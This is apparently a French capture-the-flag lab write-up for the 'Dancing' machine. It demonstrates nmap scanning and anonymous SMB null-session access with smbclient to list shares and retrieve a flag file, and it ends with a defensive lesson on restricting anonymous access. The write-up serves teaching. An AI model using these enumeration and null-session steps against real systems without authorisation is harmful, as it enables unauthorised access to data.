[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 3 — Dancing

**Partages SMB non protégés — Port 445**

| | |
|---|---|
| **Tier** | 1 |
| **OS** | Windows |
| **Service** | SMB (445) |

## Concept

Découvrir et exploiter une session SMB nulle (sans identifiants) pour accéder à des partages réseau.

## Méthodologie

### Scan de ports

```bash
nmap -sV -sC 10.129.x.x
```

```
445/tcp open  microsoft-ds
```

### Énumération des partages (session nulle)

```bash
smbclient -L //10.129.x.x/ -N
```

`-N` établit une session nulle (sans mot de passe). Résultat : liste des partages disponibles, dont `WorkShares`.

### Connexion au partage et récupération du flag

```bash
smbclient //10.129.x.x/WorkShares -N
```

```
smb: \> ls
smb: \> get flag.txt
smb: \> exit
```

```bash
cat flag.txt
```

## Points clés

- Une session SMB nulle donne accès aux partages mal configurés, sans identifiants.
- Toujours énumérer tous les partages disponibles avant de conclure à un accès refusé.

## Leçon retenue

*Restreindre l'accès anonyme aux partages SMB et exiger systématiquement une authentification.*

---

[⬅ Précédent : Fawn](02-fawn.md) · [⬆ Index Starting Point](../README.md) · [Suivant : Redeemer ➡](04-redeemer.md)
